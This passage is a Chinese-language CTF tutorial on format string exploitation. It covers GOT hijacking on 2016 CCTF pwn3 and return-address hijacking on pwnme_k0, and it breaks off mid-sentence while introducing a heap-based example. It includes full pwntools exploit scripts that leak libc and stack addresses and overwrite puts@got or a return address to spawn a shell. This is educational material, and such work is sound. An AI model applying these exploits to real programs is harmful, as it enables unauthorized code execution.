\u8fd9\u4e2a\u5e93\u6ca1\u6709\u7528\u5230\u53ef\u4ee5\u6ce8\u91ca\u6389 # from LibcSearcher import * goodluck = ELF('./goodluck') if args['REMOTE']: sh = remote('pwn.sniperoj.cn', 30017) else: sh = process('./goodluck') payload = \"%9$s\" print payload ##gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() hijack GOT \u539f\u7406 \u5728\u76ee\u524d\u7684 C \u7a0b\u5e8f\u4e2d\uff0clibc \u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7 GOT \u8868\u6765\u8df3\u8f6c\u7684\uff08\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\uff09\u3002\u6b64\u5916\uff0c\u5728\u6ca1\u6709\u5f00\u542f RELRO \u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2a libc \u7684\u51fd\u6570\u5bf9\u5e94\u7684 GOT \u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2a libc \u51fd\u6570\u7684 GOT \u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 printf \u7684 got \u8868\u9879\u5185\u5bb9\u4e3a system \u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884c printf \u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570 A \u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570 B \u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u3002 \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570 A \u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\uff08\u56e0\u4e3a\u8fd9\u7c7b\u51fd\u6570\u4f1a\u5728\u7a0b\u5e8f\u6e90\u7801\u4e2d\u4f7f\u7528\u5230\uff0c\u6240\u4ee5\u80fd\u76f4\u63a5\u6216\u95f4\u63a5\u4ece elf \u6587\u4ef6\u4e2d\u8bfb\u53d6\uff09 \u786e\u5b9a\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570 B \u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite \u51fd\u6570\uff08\u5e38\u89c1\uff09 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\uff08\u5e38\u89c1\uff09 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset \u4f8b\u5b50 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 CCTF \u4e2d\u7684 pwn3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u786e\u5b9a\u4fdd\u62a4 \u5982\u4e0b \u279c 2016-CCTF-pwn3 git:(master) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002RELRO \u662f\u90e8\u5206\u4fdd\u62a4\uff0c\u8fd9\u79cd\u72b6\u6001\u4e0b\u53ef\u4ee5\u4fee\u6539 GOT \u8868\uff0c\u5982\u679c\u662f FULL \u5219\u4e0d\u884c\u3002\u53e6\u5916\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542f ASLR \u4fdd\u62a4\u7684\u3002 \u5206\u6790\u7a0b\u5e8f \u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684 ftp\uff0c\u5177\u6709 get\uff0cput\uff0cdir \u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728 get \u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file() { char dest; // [sp+1Ch] [bp-FCh]@5 char s1; // [sp+E4h] [bp-34h]@1 char *i; // [sp+10Ch] [bp-Ch]@3 printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 0x28);//\u5c06\u5185\u5bb9\u590d\u5236\u5230dest return printf(&dest);//\u8f93\u51fadest\u5185\u5bb9 } } return printf(&dest); } \u6f0f\u6d1e\u5229\u7528\u601d\u8def \u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f \u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : filename.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive() exp \u66ff\u6362\u6211\u5199\u5f97\u7248\u672c\uff0c\u8fd9\u6761\u9898\u76ee\u7684\u5b8c\u6574 WP \uff1a 2016_CCTF_pwn3_writeup \u6ce8\u610f \u6211\u5728\u83b7\u53d6 puts \u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f 8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d 4 \u4e2a\u5b57\u8282\u5c31\u662f puts \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f 7\u3002 \u6ce8\u89e3 \uff1a\u7ed3\u5408 payload \u6765\u770b\uff1a payload = \"%8$s\" + p32(puts_got) \uff0c %8$S \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 7\uff1b p32(puts_got) \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 8 ; \u8fd9\u91cc\u6211\u5229\u7528\u4e86 pwntools \u4e2d\u7684 fmtstr_payload \u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91cc fmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002 hijack retaddr \u539f\u7406 \u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002 \u4f8b\u5b50 \u8fd9\u91cc\u6211\u4eec\u4ee5 \u4e09\u4e2a\u767d\u5e3d - pwnme_k0 \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002 \u786e\u5b9a\u4fdd\u62a4 \u279c \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git:(master) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4ee5\u53ca Full RELRO \u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684 got \u8868\u4e86\u3002 \u5206\u6790\u7a0b\u5e8f \u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4) { write(0, \"Welc0me to sangebaimao!\\n\", 0x1AuLL); printf(&formata, \"Welc0me to sangebaimao!\\n\"); return printf(&a4 + 4); } \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a &a4 + 4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 password \u5185\u5bb9\u4e5f\u662f v6 = read(0, (char *)&a4 + 4, 0x14uLL); \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 username \u5728\u8ddd\u79bb\u7684 password 20 \u4e2a\u5b57\u8282\u3002 puts(\"Input your username(max lenth:20): \"); fflush(stdout); v8 = read(0, &bufa, 0x14uLL); if ( v8 && v8 <= 0x14u ) { puts(\"Input your password(max lenth:20): \"); fflush(stdout); v6 = read(0, (char *)&a4 + 4, 0x14uLL); fflush(stdout); *(_QWORD *)buf = bufa; *(_QWORD *)(buf + 8) = a3; *(_QWORD *)(buf + 16) = a4; \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002 \u5229\u7528\u601d\u8def \u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684 shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u5728 0x00000000004008A6 \u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528 system('bin/sh') \u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86 shell\u3002 \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8e rbp \u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002 \u6ce8\u89e3 \uff1a \u4e0a\u9762\u8fd9\u53e5\u8bdd\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a\u6709\u4e00\u4e2a\u72ec\u7acb\u51fd\u6570 A \u7684\u6808\u5e27\uff0c\u8fd9\u4e2a A \u6808\u5e27\u6574\u4f53\u5b58\u653e\u5730\u5740\u662f\u52a8\u6001\u53d8\u5316\u7684\u3002\u4f46\u662f A \u6808\u5e27\u5185\u90e8\u7684\u7ed3\u6784\u662f\u56fa\u5b9a\u7684\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1arbp \u4e00\u5b9a\u5728 rip \u524d\u9762\uff08\u4f4e\u5730\u5740\uff09\u3002\u8fd8\u6709\u6211\u4eec\u77e5\u9053\u7684\u662f rbp \u5b58\u50a8\u7684\u662f\u4e0a\u4e00\u4e2a\u6808\u5e27\u7684 rbp \u5730\u5740\uff0c\u5982\u679c\u8bf4\u6bcf\u6b21\u90fd\u662f\u901a\u8fc7\u51fd\u6570 B \u8c03\u7528\u51fd\u6570 A \uff0c\u56e0\u4e3aAB \u6808\u5e27\u957f\u5ea6&\u7ed3\u6784\u56fa\u5b9a\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6cc4\u9732\u51fd\u6570 A rbp \u7684\u503c\u51cf\u53bb\u504f\u79fb\u5f97\u5230\u51fd\u6570 A rip \u5730\u5740\u3002 \u5229\u7528\u601d\u8def\u5982\u4e0b \u786e\u5b9a\u504f\u79fb \u83b7\u53d6\u51fd\u6570\u7684 rbp \u4e0e\u8fd4\u56de\u5730\u5740 \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740 \u5c06\u6267\u884c system \u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 \u786e\u5b9a\u504f\u79fb \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540d aaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2a printf(&a4 + 4) \u51fd\u6570\u5904 Register Account first! Input your username(max lenth:20): aaaaaaaa Input your password(max lenth:20): %p%p%p%p%p%p%p%p%p%p Register Success!! 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >error options 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >1 ... \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1f lea rdi, [rbp+0x10] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [rip+0x20184a] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [rip+0x20184a] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a 5 + 3 = 8\u3002 \u6ce8\u89e3 \uff1a \u8fd9\u91cc\u6211\u8fd8\u662f\u7528\u6211\u4e60\u60ef\u7684\u65b9\u6cd5\uff0c\u8f93\u51fa\u51e0\u4e2a %p \u76f4\u63a5\u6570\u51fa\u6765\u504f\u79fb\u3002 \u4fee\u6539\u5730\u5740 \u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\uff08b printf\uff09\u5904\u6808\u7684\u4fe1\u606f 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740 (\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528 show account \u51fd\u6570\u65f6\u6267\u884c push rip \u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a 7\u3002 \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86 rbp \u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 0x0000000000400d74 \u4e0e 0x00000000004008A6 \u53ea\u6709\u4f4e 2 \u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u6539 0x00007fffffffdb48 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u3002 \u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u7684\u662f \u5728\u67d0\u4e9b\u8f83\u65b0\u7684\u7cfb\u7edf (\u5982 ubuntu 18.04) \u4e0a, \u76f4\u63a5\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008A6 \u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u7a0b\u5e8f crash , \u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008AA, \u5373\u76f4\u63a5\u8c03\u7528 system(\"/bin/sh\") \u5904 .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text:00000000004008B7 retn \u5229\u7528\u7a0b\u5e8f #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwnme_k0.py from pwn import * context.log_level = 'debug' p = process(\"./pwnme_k0\") elf = ELF(\"./pwnme_k0\") # leak stack addr payload = 'a'*0x8 + \"%6$p\" p.recvuntil(\"20): \\n\") p.send(payload) p.recvuntil(\"20): \\n\") p.send(payload) p.recvuntil('>') #gdb.attach(p,'b printf') p.sendline('1') p.recvuntil('a'*0x8) stack_leak = int(p.recv(14),16) - 0x38 log.info(\"stack_leak:\"+hex(stack_leak)) # hijack retaddr payload1 = p64(stack_leak) payload2 = \"%2218d%8$hn\" p.recvuntil('>') p.sendline('2') p.recvuntil(\"20): \\n\") p.sendline(payload1) p.recvuntil(\"20): \\n\") p.sendline(payload2) p.recvuntil('>') p.sendline('1') p.interactive() \u6ce8\u89e3 \uff1a \u6cc4\u9732\u5730\u5740\u7684\u65f6\u5019\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7528\u7684\u662f %p \uff0c\u5982\u679c\u7528 %s \u518d u64 \u6cc4\u9732\u51fa\u6765\u7684\u662f\u51fd\u6570 B \u7684 rbp \u7684\u503c\u3002\u539f\u56e0\u4e5f\u5f88\u7b80\u5355\uff0c\u8981\u6c42\u8f93\u51fa\u7684\u662f\u5b57\u7b26\uff0c\u7cfb\u7edf\u5230\u51fd\u6570 A rbp \u7684\u503c\u6307\u5411\u7684\u5730\u5740\u53d6\u503c\uff0c\u4e5f\u5c31\u662f\u51fd\u6570 B \u7684\u503c\u3002\u5982\u679c\u662f %p \u5c31\u5c06\u51fd\u6570 A rbp \u7684\u503c\u8f93\u51fa\u3002 hijack \u90e8\u5206\u7684 payload \uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53ef\u4ee5\u653e\u5230 name \u8f93\u5165\uff0c\u4e5f\u5c31\u662f\u548c stack_leak \u4e00\u8d77\u8f93\u5165\uff0cpassword \u5c31\u968f\u4fbf\u8f93\u5165\u70b9\u4e1c\u897f\u884c\u4e86\u3002\u8fd9\u91cc\u56e0\u4e3a\u8f93\u5165\u957f\u5ea6\u73b0\u5728\uff0c\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528\u6700\u7a33\u59a5\u7684 \u5355\u5b57\u8282 \u8f93\u5165\uff0c\u800c\u662f\u53cc\u5b57\u8282\u3002 \u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u539f\u7406 \u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002\uff08\u51fa\u73b0\u60c5\u51b5\u5c31\u50cf\u4e0b\u9762\u4f8b\u5b50\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u5b57\u7b26\u6307\u9488\u6307\u5411\u6808\u4e0a\uff0c\u51fa\u73b0\u7684\u60c5\u51b5\u662f\u6211\u4eec\u4e0d\u80fd\u5bb9\u6613\u63a7\u5236\u5199\u5165\u7684\u5730\u5740\uff09 \u4f8b\u5b50 \u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 CSAW \u4e2d\u7684 contacts \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u786e\u5b9a\u4fdd\u62a4 \u279c 2015-CSAW-contacts git:(master) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86 Canary\u3002\uff08RELRO 